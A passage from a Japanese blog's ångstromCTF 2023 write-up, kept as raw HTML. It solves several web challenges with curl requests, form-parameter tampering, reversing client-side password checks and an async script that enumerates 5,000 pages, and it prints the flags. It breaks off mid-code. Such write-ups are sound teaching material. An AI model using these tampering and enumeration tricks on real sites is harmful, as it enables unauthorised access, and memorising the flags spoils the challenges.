@@ -1,0 +1,392 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[ångstromCTF 2023] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="ångstromCTF 2023が2023/04/23 0:00 - 2023/04/27 0:00 (UTC)で開催されました。
+[web] catch me if you can ページのsourceにflagが書かれています。
+$ curl https://catch-me-if-you-can.web.actf.co/ | grep &#34;actf{&#34; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1141 100 1141 0 0 143 0 0:00:07 0:00:07 --:--:-- 307 <marquee scrollamount=&#34;50&#34; id=&#34;flag&#34;>actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}</marquee> [web] Celeste Speedrunning Association / をGETすると、以下が表示されます。
+Welcome to Celeste speedrun records!!! Current record holders (beat them at /play for a flag!"><meta property="og:image" content><meta property="og:title" content="[ångstromCTF 2023] My own writeup"><meta property="og:description" content="ångstromCTF 2023が2023/04/23 0:00 - 2023/04/27 0:00 (UTC)で開催されました。
+[web] catch me if you can ページのsourceにflagが書かれています。
+$ curl https://catch-me-if-you-can.web.actf.co/ | grep &#34;actf{&#34; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1141 100 1141 0 0 143 0 0:00:07 0:00:07 --:--:-- 307 <marquee scrollamount=&#34;50&#34; id=&#34;flag&#34;>actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}</marquee> [web] Celeste Speedrunning Association / をGETすると、以下が表示されます。
+Welcome to Celeste speedrun records!!! Current record holders (beat them at /play for a flag!"><meta property="og:type" content="article"><meta property="og:url" content="/posts/34/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-27T09:06:37+09:00"><meta property="article:modified_time" content="2023-04-27T09:06:37+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[ångstromCTF 2023] My own writeup"><meta name=twitter:description content="ångstromCTF 2023が2023/04/23 0:00 - 2023/04/27 0:00 (UTC)で開催されました。
+[web] catch me if you can ページのsourceにflagが書かれています。
+$ curl https://catch-me-if-you-can.web.actf.co/ | grep &#34;actf{&#34; % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1141 100 1141 0 0 143 0 0:00:07 0:00:07 --:--:-- 307 <marquee scrollamount=&#34;50&#34; id=&#34;flag&#34;>actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}</marquee> [web] Celeste Speedrunning Association / をGETすると、以下が表示されます。
+Welcome to Celeste speedrun records!!! Current record holders (beat them at /play for a flag!"><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[ångstromCTF 2023] My own writeup</h1><div class=meta>Posted on Apr 27, 2023</div></div><nav id=TableOfContents><ol><li><a href=#web-catch-me-if-you-can>[web] catch me if you can</a></li><li><a href=#web-celeste-speedrunning-association>[web] Celeste Speedrunning Association</a></li><li><a href=#web-shortcircuit>[web] shortcircuit</a></li><li><a href=#web-directory>[web] directory</a></li><li><a href=#web-celeste-tunneling-association>[web] Celeste Tunneling Association</a></li><li><a href=#web-hallmark>[web] hallmark</a></li></ol></nav><section class=body><p>ångstromCTF 2023が2023/04/23 0:00 - 2023/04/27 0:00 (UTC)で開催されました。</p><h1 id=web-catch-me-if-you-can>[web] catch me if you can</h1><p>ページのsourceにflagが書かれています。</p><pre tabindex=0><code>$ curl https://catch-me-if-you-can.web.actf.co/ | grep &#34;actf{&#34;
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1141  100  1141    0     0    143      0  0:00:07  0:00:07 --:--:--   307
+        &lt;marquee scrollamount=&#34;50&#34; id=&#34;flag&#34;&gt;actf{y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874}&lt;/marquee&gt;
+</code></pre><h1 id=web-celeste-speedrunning-association>[web] Celeste Speedrunning Association</h1><p><code>/</code> をGETすると、以下が表示されます。</p><pre tabindex=0><code>Welcome to Celeste speedrun records!!!
+Current record holders (beat them at /play for a flag!):
+1. Old Lady: 0 seconds
+2. Madeline: 10 seconds
+3. Badeline: 10.1 seconds
+</code></pre><p><code>/play</code>をGETすると以下のフォームが存在します。にvalueを<code>1682344303.794233</code>として<code>/submit</code>にPOSTするようです。</p><pre tabindex=0><code>&lt;form action=&#34;/submit&#34; method=&#34;POST&#34;&gt;
+  &lt;input type=&#34;text&#34; style=&#34;display: none;&#34; value=&#34;1682344303.794233&#34; name=&#34;start&#34; /&gt;
+  &lt;input type=&#34;submit&#34; value=&#34;Press when done!&#34; /&gt;
+&lt;/form&gt;
+</code></pre><p>よくわかりませんが、<code>/submit</code>に<code>start</code>のvalueを適当な大きい値に設定してsubmitするとflagが得られました。</p><pre tabindex=0><code>$ curl -X POST -d &#39;start=100000000000000000000&#39; https://mount-tunnel.web.actf.co/submit
+you win the flag: actf{wait_until_farewell_speedrun}
+</code></pre><h1 id=web-shortcircuit>[web] shortcircuit</h1><p>ページのsourceは以下です。<code>chunk()</code>でflagをいくつかに分割して配列にして、<code>swap()</code>配列の要素の位置を入れ替える処理を行っています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.html data-lang=:.html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>title</span>&gt;Short Circuit&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>swap</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>x</span>) =&gt; {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>                <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>chunk</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>n</span>) =&gt; {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>ret</span> <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>+=</span><span style=color:#a6e22e>n</span>){
+</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>ret</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>substring</span>(<span style=color:#a6e22e>i</span>,<span style=color:#a6e22e>i</span><span style=color:#f92672>+</span><span style=color:#a6e22e>n</span>))
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ret</span>
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>check</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>e</span>) =&gt; {
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (document.<span style=color:#a6e22e>forms</span>[<span style=color:#ae81ff>0</span>].<span style=color:#a6e22e>username</span>.<span style=color:#a6e22e>value</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;admin&#34;</span>){
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>swap</span>(<span style=color:#a6e22e>chunk</span>(document.<span style=color:#a6e22e>forms</span>[<span style=color:#ae81ff>0</span>].<span style=color:#a6e22e>password</span>.<span style=color:#a6e22e>value</span>, <span style=color:#ae81ff>30</span>)).<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7&#34;</span>){
+</span></span><span style=display:flex><span>                        <span style=color:#a6e22e>location</span>.<span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/win.html&#34;</span>
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                    <span style=color:#66d9ef>else</span>{
+</span></span><span style=display:flex><span>                        document.<span style=color:#a6e22e>getElementById</span>(<span style=color:#e6db74>&#34;msg&#34;</span>).<span style=color:#a6e22e>style</span>.<span style=color:#a6e22e>display</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;block&#34;</span>
+</span></span><span style=display:flex><span>                    }
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>script</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;username&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Username&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text&#34;</span> /&gt;
+</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> <span style=color:#a6e22e>placeholder</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Password&#34;</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;password&#34;</span> /&gt;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            &lt;<span style=color:#f92672>input</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;button&#34;</span> <span style=color:#a6e22e>onclick</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;check()&#34;</span> <span style=color:#a6e22e>value</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Log in&#34;</span>/&gt;
+</span></span><span style=display:flex><span>        &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>        &lt;<span style=color:#f92672>p</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;msg&#34;</span> <span style=color:#a6e22e>style</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;display:none;color:red;&#34;</span>&gt;Username or password incorrect&lt;/<span style=color:#f92672>p</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>この逆の処理を行ってflagを得ます。<code>swap()</code>の逆の処理を行う<code>reverse_swap()</code>を用意します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>chunk</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>x</span>, <span style=color:#a6e22e>n</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>ret</span> <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>(<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>length</span>; <span style=color:#a6e22e>i</span><span style=color:#f92672>+=</span><span style=color:#a6e22e>n</span>){
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ret</span>.<span style=color:#a6e22e>push</span>(<span style=color:#a6e22e>x</span>.<span style=color:#a6e22e>substring</span>(<span style=color:#a6e22e>i</span>,<span style=color:#a6e22e>i</span><span style=color:#f92672>+</span><span style=color:#a6e22e>n</span>))
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>ret</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>reverse_swap</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>x</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>2</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>t</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>3</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>x</span>[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>t</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>x</span>
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>target</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;7e08250c4aaa9ed206fd7c9e398e2}actf{cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7&#34;</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#a6e22e>reverse_swap</span>(<span style=color:#a6e22e>chunk</span>(<span style=color:#a6e22e>target</span>, <span style=color:#ae81ff>30</span>)).<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#34;&#34;</span>)) <span style=color:#75715e>// actf{cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2}
+</span></span></span></code></pre></div><h1 id=web-directory>[web] directory</h1><p>ページのsourceは以下のようになっています。5000個のhtmlファイルがあります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.html data-lang=:.html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;&lt;<span style=color:#f92672>body</span>&gt;&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.html&#34;</span>&gt;page 0&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.html&#34;</span>&gt;page 1&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;2.html&#34;</span>&gt;page 2&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;3.html&#34;</span>&gt;page 3&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;4.html&#34;</span>&gt;page 4&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;5.html&#34;</span>&gt;page 5&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>...
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;4996.html&#34;</span>&gt;page 4996&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;4997.html&#34;</span>&gt;page 4997&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;4998.html&#34;</span>&gt;page 4998&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>a</span> <span style=color:#a6e22e>href</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;4999.html&#34;</span>&gt;page 4999&lt;/<span style=color:#f92672>a</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt;
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>body</span>&gt;&lt;/<span style=color:#f92672>html</span>&gt;
+</span></span></code></pre></div><p>試しに<code>0.html</code>を見てみると、<code>your flag is in another file</code>と書かれています。どれか一つのファイルにflagが書かれているようです。</p><p>非同期で5000個のhtmlファイルをGETするスクリプトを用意します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#f92672>import</span> asyncio
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> aiohttp
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fetch</span>(url, session):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>with</span> session<span style=color:#f92672>.</span>get(url) <span style=color:#66d9ef>as</span> response:
+</span></span><span style=display:flex><span>        text <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> response<span style=color:#f92672>.</span>text()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> text
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>main</span>():
+</span></span><span style=display:flex><span>    base_url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;https://directory.web.actf.co&#39;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>async</span> <span style=color:#66d9ef>with</span> aiohttp<span style=color:#f92672>.</span>ClientSession() <span style=color:#66d9ef>as</span> session:
+</span></span><span style=display:flex><span>        tasks <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>5000</span>):
+</span></span><span style=display:flex><span>            url <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>base_url<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>.html&#39;</span>
+</span></span><span style=display:flex><span>            tasks<span style=color:#f92672>.</span>append(asyncio<span style=color:#f92672>.</span>ensure_future(fetch(url, session)))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        responses <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> asyncio<span style=color:#f92672>.</span>gather(<span style=color:#f92672>*</span>tasks)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> i, r_text <span style=color:#f92672>in</span> enumerate(responses):
+</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>&#39;count:&#39;</span>, i)
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> r_text <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;your flag is in another file&#39;</span>:
+</span></span><span style=display:flex><span>                print(r_text)
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
+</span></span><span style=display:flex><span>    loop <span style=color:#f92672>=</span> asyncio<span style=color:#f92672>.</span>get_event_loop()
+</span></span><span style=display:flex><span>    loop<span style=color:#f92672>.</span>run_until_complete(main())
+</span></span></code></pre></div><p><code>3054.html</code>にflagが書かれていました。</p><pre tabindex=0><code>$ python3 solver.py
+count: 0
+count: 1
+...
+count: 3053
+count: 3054
+actf{y0u_f0und_me_b51d0cde76739fa3}
+</code></pre><h1 id=web-celeste-tunneling-association>[web] Celeste Tunneling Association</h1><p>以下の<code>app.py</code>が与えられます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#75715e># run via `uvicorn app:app --port 6000`</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>SECRET_SITE <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;flag.local&#34;</span>
+</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ[<span style=color:#e6db74>&#39;FLAG&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>app</span>(scope, receive, send):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>assert</span> scope[<span style=color:#e6db74>&#39;type&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;http&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    headers <span style=color:#f92672>=</span> scope[<span style=color:#e6db74>&#39;headers&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>await</span> send({
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;type&#39;</span>: <span style=color:#e6db74>&#39;http.response.start&#39;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;status&#39;</span>: <span style=color:#ae81ff>200</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;headers&#39;</span>: [
+</span></span><span style=display:flex><span>            [<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;content-type&#39;</span>, <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;text/plain&#39;</span>],
+</span></span><span style=display:flex><span>        ],
+</span></span><span style=display:flex><span>    })
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># IDK malformed requests or something</span>
+</span></span><span style=display:flex><span>    num_hosts <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> name, value <span style=color:#f92672>in</span> headers:
